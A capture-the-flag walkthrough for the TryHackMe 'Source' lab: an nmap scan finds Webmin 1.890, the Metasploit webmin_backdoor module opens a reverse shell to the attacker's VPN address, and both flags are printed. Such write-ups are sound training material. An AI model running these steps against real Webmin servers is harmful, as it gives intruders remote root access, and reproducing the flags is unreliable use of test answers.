# TryHackMe [Source](https://tryhackme.com/room/source)
### References
* DarkSec. (2020). TryHackMe Source Official Walkthrough [YouTube Video]. In YouTube. https://youtu.be/A7PUyzsXE3c
* gdft2112. (2019, August 16). Webmin password_change.cgi Command Injection. AttackerKB. https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection
## Reconnaissance
* `nmap`:
```bash
$ nmap -sCV -vv <MACHINE_IP>
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbZAxRhWUij6g6MP11OkGSk7vYHRNyQcTIdMmjj1kSvDhyuXS9QbM5t2qe3UMblyLaObwKJDN++KWfzl1+beOrq3sXkTA4Wot1RyYo0hPdQT0GWBTs63dll2+c4yv3nDiYAwtSsPLCeynPEmSUGDjkVnP12gxXe/qCsM2+rZ9tzXtSWiXgWvaxMZiHaQpT1KaY0z6ebzBTI8siU0t+6SMK7rNv1CsUNpGeicfbC5ZOE4/Nbc8cxNl7gDtZbyjdh9S7KTvzkSj2zBJ+8VbzsuZk1yy8uyLDgmuBQ6LzbYUNHkTQhJetVq7utFpRqLdpSJTcsz5PAxd1Upe9DqoYURuL
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEYCha8jk+VzcJRRwV41rl8EuJBiy7Cf8xg6tX41bZv0huZdCcCTCq9dLJlzO2V9s+sMp92TpzR5j8NAAuJt0DA=
|   256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJnY5oycmgw6ND6Mw4y0YQWZiHoKhePo4bylKKCP0E5
10000/tcp open  http    syn-ack MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: C6CB391D8234CA76B9025B09BFB32F43
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## `user.txt`
```bash
$ msfconsole -q
msf6 > use exploit/linux/http/webmin_backdoor
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS <MACHINE_IP>
RHOSTS => <MACHINE_IP>
msf6 exploit(linux/http/webmin_backdoor) > set LHOST tun0
LHOST => <OPENVPN_IP>
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > run
$ find /home -type f -name "user.txt"
/home/dark/user.txt
$ cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
```

## `root.txt`
```bash
$ find /root -type f -name "root.txt"
/root/root.txt
$ cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
```